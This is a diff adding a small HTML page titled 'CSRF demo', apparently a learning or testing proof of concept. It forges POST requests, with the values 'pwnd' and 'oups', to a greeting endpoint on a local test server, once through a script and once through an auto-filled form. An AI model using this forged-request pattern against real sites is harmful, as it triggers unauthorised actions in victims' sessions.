@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF demo</title>
+    <script>
+        async function sendRequest() {
+            const greeting = { id: "60", content: "pwnd" };
+            const result = await fetch("http://localhost:8080/greeting", {
+                method: "POST",
+                body: greeting
+            });
+        }
+    </script>
+</head>
+
+<body>
+    <p>
+        Post requset to http://localhost:8080/greeting
+    </p>
+    <button onclick="sendRequest()">Send</button>
+
+    <form action="http://localhost:8080/greeting" method="post">
+        <p>Id: </p>
+        <input type="text" name="id" value="90">
+        <p>Content: </p>
+        <input type="text" name="content" value="oups">
+        <button type="submit">send</button>
+    </form>
+</body>
+
+</html>
